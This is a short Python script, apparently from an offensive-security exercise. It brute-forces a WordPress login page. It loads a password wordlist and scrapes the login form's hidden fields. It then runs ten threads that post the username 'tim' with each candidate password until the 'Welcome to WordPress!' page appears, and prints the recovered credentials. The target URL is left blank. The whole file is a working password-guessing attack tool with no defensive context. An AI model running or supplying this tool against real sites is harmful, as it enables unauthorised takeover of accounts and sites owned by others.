from io import BytesIO
from lxml import etree
from queue import Queue
import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'
TARGET = 'http://' # URL
wordlist = 'cain-and-abel.txt' #wordlist

def get_words():
    with open(wordlist) as f:
        raw_words = f.read()
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = {}
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser)
    for element in tree.iter():
        name = element.get('name')
        if name is not None:
            params[name] = element.get('value', None)
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print(f"Finished the setup where username = {username}\n")

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd
            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print(f"Username is {self.username}")
                print(f"Password is {passwd}\n")
                print('done: now cleaning up other threads...')

if __name__ == '__main__':
    words = get_words()
    b = Bruter('tim', TARGET)  # Используем переменную TARGET
    b.run_bruteforce(words)
